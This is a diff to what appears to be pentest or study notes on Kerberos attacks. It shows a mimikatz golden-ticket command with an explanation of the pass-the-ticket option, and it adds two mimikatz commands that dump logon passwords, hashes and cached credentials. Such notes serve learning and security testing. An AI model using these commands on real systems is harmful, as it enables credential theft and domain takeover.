@@ -125,7 +125,11 @@ mimikatz # kerberos::golden /User:FakeUser /domain:[Domain].local /sid:[Domain S
 
 -> "/ptt": means Pass-The-Ticket type of ticket. This means instead of just printing the ticket to the screen, the forged TGT ticket becomes active and can be used in the current Kerberos session run by the attacker to open up processes.
 
+***
+### Mimikatz Extras:
 
+sekurlsa::logonpasswords -> dumps passwords and hashes.
+lsadump::cache -> extracts cached credentials.
 
 ***
 
